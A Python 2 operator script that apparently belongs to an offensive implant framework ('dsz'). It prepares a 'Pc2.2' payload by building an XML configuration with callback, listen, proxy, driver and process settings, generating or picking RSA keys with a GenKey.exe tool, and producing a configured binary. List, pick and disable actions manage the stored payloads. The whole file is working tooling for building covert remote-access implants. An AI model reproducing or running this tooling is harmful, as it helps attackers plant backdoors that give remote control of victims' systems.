
import dsz
import dsz.file
import dsz.lp
import dsz.menu
import dsz.payload
import dsz.version
import pc2_2

import glob
import os
import re
import shutil
import sys

#------------------------------------------------------------------------------------------
def main(argv):

	dsz.control.echo.Off()
	
	params = dsz.lp.cmdline.ParseCommandLine(argv, "_Pc2.2Prep.txt")
	if (len(params) == 0):
		return False
		
	defaultFlags = list()
	driverName=""
	procName=""
	infoValue=""
	if (params.has_key("utilityburst")):
		defaultFlags.append("PCHEAP_CONFIG_LOADED_WITH_UTILITY_BURST")		
	if (params.has_key("driver")):
		driverName = params["driver"][0]
	if (params.has_key("process")):
		procName = params["process"][0]
	if (params.has_key("info")):
		infoValue = params["info"][0]

	configFile = ""
	finalBinary = ""
	payloadInfo = None
	if (params["action"][0].lower() == "configure"):
		payloadInfo = dsz.payload.PickForPrep("Pc2.2", params)
		if (payloadInfo == None):
			return False
			
		(path, file) = dsz.payload.CreateConfigDir(payloadInfo)
		
		configLines = list()
		configGood = False
		while (not configGood):
			advanced = dsz.ui.Prompt("Update advanced settings", False);
			
			configLines.append("<?xml version='1.0' encoding='UTF-8' ?>\n")
			configLines.append("<PCConfig>\n")
	
			configLines = configLines + pc2_2.payload.config.SetFlags(payloadInfo.os[0], payloadInfo.binType[0], payloadInfo.type[0], defaultFlags, advanced)
			configLines = configLines + pc2_2.payload.config.SetId(payloadInfo.type[0], advanced)
			configLines = configLines + pc2_2.payload.config.SetListenInfo(payloadInfo.type[0], configLines, advanced)
			configLines = configLines + pc2_2.payload.config.SetCallbackInfo(payloadInfo.type[0], advanced)
			configLines = configLines + pc2_2.payload.config.SetMiscInfo(payloadInfo.type[0], driverName, procName, infoValue, advanced)
			if (advanced and payloadInfo.extraInfo.has_key("CommsType")):
				configLines = configLines + pc2_2.payload.config.SetProxyInfo(payloadInfo.extraInfo["CommsType"][0], advanced)
				configLines = configLines + pc2_2.payload.config.SetProxyConnectionParameters(payloadInfo.extraInfo["CommsType"][0], advanced)
			payloadInfo.extraInfo["KeyLocation"] = list()
			payloadInfo.extraInfo["KeyLocation"].append(_getPcKey())
		
			configLines.append("</PCConfig>\n")
		
			dsz.ui.Echo("Configuration:")
			dsz.ui.Echo("")
			for line in configLines:
				line = re.sub("\n", "", line)
				dsz.ui.Echo(line)
			dsz.ui.Echo("")
			if (dsz.ui.Prompt("Is this configuration valid", True)):
				configGood = True
			else:
				configLines = list()

		# store the config file
		try:
			f = open("%s/config.xml" % path, "wb")
			try:
				f.write("\xEF\xBB\xBF")
				f.writelines(configLines)
			finally:
				f.close()
		except:
			dsz.ui.Echo("* Failed to write configuration file", dsz.ERROR)
			return False

		# copy the keys
		try:
			os.mkdir("%s/Keys" % path)
		except:
			pass
		
		try:
			shutil.copy("%s/private_key.bin" % payloadInfo.extraInfo["KeyLocation"][0], "%s/Keys/private_key.bin" % path)
			shutil.copy("%s/public_key.bin" % payloadInfo.extraInfo["KeyLocation"][0], "%s/Keys/public_key.bin" % path)
		except:
			dsz.ui.Echo("* Failed to copy keys", dsz.WARNING)
			dsz.ui.Pause()
		
		# run the config tool
		finalBinary = pc2_2.payload.exe.ConfigBinary(path, file, payloadInfo.extraInfo["KeyLocation"][0], payloadInfo.extraInfo, payloadInfo.type[0])
		if (finalBinary == ""):
			dsz.ui.Echo("* Failed to configure binary", dsz.ERROR)
			return False

		# store the payload information
		configFile = dsz.payload.StoreInfo(payloadInfo, path, finalBinary)
		if (configFile == ""):
			dsz.ui.Echo("* Failed to write payload information file", dsz.ERROR)
			return False

	elif (params["action"][0].lower() == "disable"):
		if (not params.has_key("file")):
			dsz.ui.Echo("* Disable requires the -file option", dsz.ERROR)
			return False
	
		(dir, file) = dsz.path.Split(params["file"][0])
		if (len(dir) == 0):
			dsz.ui.Echo("* Unable to disable %s" % params["file"], dsz.ERROR)
			return False

		os.rename("%s/payload_info.xml" % dir, "%s/payload_info.xml.deployed" % dir)

	else:
		# list / pick
		dirs = dsz.payload.GetConfigured(params, _extraPayloadCheck)
		if (len(dirs) == 0):
			dsz.ui.Echo("* No matching payloads found", dsz.ERROR)
			return False
		
		if (params["action"][0].lower() == "pick"):
			dsz.ui.Echo("")
			dsz.ui.Echo(" 0) - Quit")
		
		i = 0
		while (i < len(dirs)):
			try:
				info = dsz.payload.GetInfo(dirs[i])
				dsz.ui.Echo("")
				dsz.ui.Echo("%2u) - %s" % (i+1, dirs[i]))
				dsz.ui.Echo("    %s (%s)" % (info.description[0], info.name[0]))
				dsz.ui.Echo("        %s-%s %s %s" % (info.arch[0], info.os[0], info.type[0], info.binType[0]))
				for key in info.extraInfo.keys():
					if (len(info.extraInfo[key][0]) > 0):
						dsz.ui.Echo("        %s='%s'" % (key, info.extraInfo[key][0]))
				dsz.ui.Echo("")
			
				if (params.has_key("verbose") and (params["verbose"][0] == "true")):
					try:
						f = open("%s/config.xml" % dirs[i], "r")
						try:
							lines = f.readlines()
							for line in lines:
								line = re.sub("\r", "", line)
								line = re.sub("\n", "", line)
								dsz.ui.Echo("        %s" % line)
						finally:
							f.close()
					except:
						pass
			except:
				dsz.ui.Echo("* Failed to get info for %s" % dirs[i], dsz.ERROR)
				
			i = i + 1

		if (params["action"][0].lower() == "pick"):
			pick = -1
			while (pick == -1):
				val = dsz.ui.GetInt("Pick the payload")
				if (val == 0):
					# quit
					return False
				elif ((val < 0) or (val > len(dirs))):
					dsz.ui.Echo("* Invalid choice", dsz.ERROR)
				else:
					pick = val

			# reduce pick by one to get to index
			index = pick - 1
			payloadInfo = dsz.payload.GetInfo(dirs[index])
			if (payloadInfo == None):
				dsz.ui.Echo("* Failed to get payload info")
				return False

			finalBinary	= payloadInfo.baseFile[0]
			configFile	= "%s/payload_info.xml" % dirs[index]

	if (payloadInfo != None):
		dsz.script.data.Start("Payload")
		if (payloadInfo.name[0] != ""):
			dsz.script.data.Add("Description", payloadInfo.description[0], dsz.TYPE_STRING)
			dsz.script.data.Add("Name", payloadInfo.name[0], dsz.TYPE_STRING)
			dsz.script.data.Add("ShortName", payloadInfo.shortName[0], dsz.TYPE_STRING)
			dsz.script.data.Add("Arch", payloadInfo.arch[0], dsz.TYPE_STRING)
			dsz.script.data.Add("Os", payloadInfo.os[0], dsz.TYPE_STRING)
			dsz.script.data.Add("BinType", payloadInfo.binType[0], dsz.TYPE_STRING)
			dsz.script.data.Add("Type", payloadInfo.type[0], dsz.TYPE_STRING)
			
		if (len(configFile) > 0):
			dsz.script.data.Add("ConfigFile", configFile, dsz.TYPE_STRING)
		
		if (len(finalBinary) > 0):
			dsz.script.data.Add("File", finalBinary, dsz.TYPE_STRING)
			dsz.ui.Echo("Configured binary at:")
			dsz.ui.Echo("  %s" % finalBinary)
		
		dsz.script.data.End()
		dsz.script.data.Store()
		
	return True

#------------------------------------------------------------------------------------
def _extraPayloadCheck(params, dir):

	if (params.has_key("utilityburst")):
		try:
			f = open("%s/config.xml" % dir, "r")
			try:
				lines = f.readlines()
				for line in lines:
					if (re.search("PCHEAP_CONFIG_LOADED_WITH_UTILITY_BURST", line) != None):
						return True
			finally:
				f.close()
		except:
			pass
			
		# no UTBU found
		return False
	
	return True

#------------------------------------------------------------------------------------
def _getPcKey():

	# get the list of existing keys
	resDir = dsz.lp.GetResourcesDirectory()
	pcResDir = "%s/Pc/Keys/" % resDir
	
	keys = list()
	keys.append("Create a new key")
	
	dirs = glob.glob("%s/*" % pcResDir)
	for dir in dirs:
		# directories that might be keys
		if (len(glob.glob("%s/private_key.bin" % dir)) > 0):
			(d, f) = dsz.path.Split(dir)
			if (len(f) > 0):
				keys.append(f)
	
	(choice, value) = dsz.menu.ExecuteSimpleMenu("Pick a key", keys)
	if (len(choice) == 0):
		dsz.ui.Echo("* Failed to pick a key", dsz.ERROR)
		return ""
	
	if (choice == "Create a new key"):
		keyName = ""
		while (len(keyName) == 0):
			keyName = dsz.ui.GetString("Enter the key name")
		
		toolLoc = resDir
		ver = dsz.version.Info(dsz.script.Env["local_address"])
		toolLoc = toolLoc + "/Pc2.2/Tools/%s-%s/GenKey.exe" % (ver.compiledArch, ver.os)
	
		try:
			os.mkdir("%s/%s" % (pcResDir, keyName))
		except:
			pass
		
		# record current flags and turn echo'ing on
		x = dsz.control.Method()
		dsz.control.echo.On()
		if (not dsz.cmd.Run("local run -command \"%s 2048 %s/%s\" -redirect -noinput" % (toolLoc, pcResDir, keyName))):
			dsz.ui.Echo("* Failed to generate new key", dsz.ERROR)
			return ""
		dsz.control.echo.Off()
		
		return "%s/%s" % (pcResDir, keyName)
	else:
		return "%s/%s" % (pcResDir, choice)
	
#------------------------------------------------------------------------------------------
	
if __name__ == '__main__':
	if (main(sys.argv) != True):
		sys.exit(-1);